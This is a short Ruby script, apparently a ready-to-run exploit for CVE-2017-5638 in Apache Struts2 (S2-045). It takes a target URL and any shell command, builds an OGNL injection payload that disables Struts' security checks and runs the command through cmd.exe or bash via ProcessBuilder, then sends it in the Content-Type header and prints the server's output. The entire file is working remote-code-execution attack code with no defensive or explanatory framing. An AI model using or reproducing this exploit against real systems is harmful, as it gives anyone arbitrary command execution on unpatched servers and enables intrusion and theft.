# CVE: 2017-5638 - Apache Struts2 S2-045
# Ruby code by	: authlook

require 'typhoeus'

if ARGV.length < 2
	abort("comando invalido")
end

url = ARGV[0]
cmda = ARGV
cmda.shift
cmd = cmda.each{|i| i}.join(" ")
puts "[*] Apache strut-auth"
puts "[*] Target : " + url
puts "[*] Command : " + cmd

payload = []
    payload << "%{(#_='multipart/form-data')."
    payload << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload << "(#_memberAccess?"
    payload << "(#_memberAccess=#dm):"
    payload << "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload << "(#ognlUtil.getExcludedPackageNames().clear())."
    payload << "(#ognlUtil.getExcludedClasses().clear())."
    payload << "(#context.setMemberAccess(#dm))))."
    payload << "(#cmd='"
    payload << cmd.to_s
    payload << "')."
    payload << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload << "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload << "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload << "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload << "(#ros.flush())}"
    
request = Typhoeus.get(url, headers: {'User-Agent'=>'Mozilla/5','Content-Type'=> payload.join})
puts request.body
